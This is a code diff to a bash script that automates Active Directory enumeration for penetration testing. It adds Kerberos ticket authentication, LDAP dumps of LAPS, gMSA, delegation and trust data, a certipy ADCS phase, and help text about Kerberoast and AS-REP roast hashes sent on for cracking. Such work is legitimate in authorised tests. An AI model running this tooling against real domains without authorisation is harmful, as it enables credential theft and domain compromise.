@@ -1713,6 +2039,8 @@ OUTPUT STRUCTURE:
     groups/        all_groups.txt, privileged_groups.txt
     computers/     all_computers.txt, old_os.txt
     hashes/        asreproast.txt, kerberoast.txt  ← feed directly to crackr.sh
+    ldap/          laps.txt, gmsa.txt, delegation.txt, trusts.txt, admin_count.txt
+    adcs/          certipy_find.txt
     bloodhound/    *.zip  ← upload to BloodHound CE
     shares/        all_shares.txt, sysvol contents
     sessions/      smb_sessions.txt, loggedon_users.txt
@@ -1721,10 +2049,16 @@ OUTPUT STRUCTURE:
     attack_commands.txt      legacy alias
 
 HASH AUTH NOTES:
-  - ldapsearch does not support NTLM hash auth — LDAP phases skipped
+  - ldapsearch does not support NTLM hash auth — LDAP MAQ query skipped
   - rpcclient uses --pw-nt-hash with the NT portion
   - impacket tools use -hashes LMHASH:NTHASH format (auto-normalized)
   - nxc uses -H NTLMHASH (NT portion only, auto-normalized)
+
+KERBEROS AUTH NOTES:
+  - Requires KRB5CCNAME environment variable pointing to a valid ccache
+  - Clock-skew tolerance is 300s — Phase 1 warns if exceeded (fix: ntpdate DC)
+  - --dc-host is strongly recommended (Kerberos requires hostname, not IP)
+  - Kerberos uses: nxc --use-kcache, impacket -k -no-pass, certipy-ad -k -no-pass
 
 EOF
 }
@@ -1771,6 +2105,10 @@ main() {
             --chain)           CHAIN_MODE=true; shift ;;
             --quick)           QUICK_MODE=true; shift ;;
             --force)           FORCE_MODE=true; shift ;;
+            -k|--kerberos)
+                KERBEROS=true
+                [[ -z "$AUTH_TYPE" ]] && AUTH_TYPE="kerberos"
+                shift ;;
             --no-color)        disable_colors; shift ;;
             -h|--help)         show_help; exit 0 ;;
             *)
@@ -1784,7 +2122,11 @@ main() {
     [[ -z "$DOMAIN" ]]    && { error "-d/--domain is required"; exit 1; }
     [[ -z "$AD_USER" ]]      && { error "-u/--user is required"; exit 1; }
     [[ -z "$DC_IP" ]]     && { error "-dc/--dc-ip is required"; exit 1; }
-    [[ -z "$AUTH_TYPE" ]] && { error "One of -p/--password or -H/--hash is required"; exit 1; }
+    [[ -z "$AUTH_TYPE" ]] && { error "One of -p/--password, -H/--hash, or -k/--kerberos is required"; exit 1; }
+    if [[ "$AUTH_TYPE" == "kerberos" && -z "${KRB5CCNAME:-}" ]]; then
+        warn "KRB5CCNAME is not set — Kerberos auth will likely fail"
+        warn "  export KRB5CCNAME=/path/to/ticket.ccache"
+    fi
     is_valid_ip "$DC_IP"  || { error "Invalid DC IP: ${DC_IP}"; exit 1; }
     is_positive_integer "$THREADS" || { error "Invalid thread count: ${THREADS}"; exit 1; }
 
@@ -1884,6 +2226,8 @@ main() {
     fi
 
     phase2_user_enum
+    phase2b_ldap_enum
+    phase2c_adcs
     phase3_kerberos
 
     if [[ "$QUICK_MODE" == false ]]; then
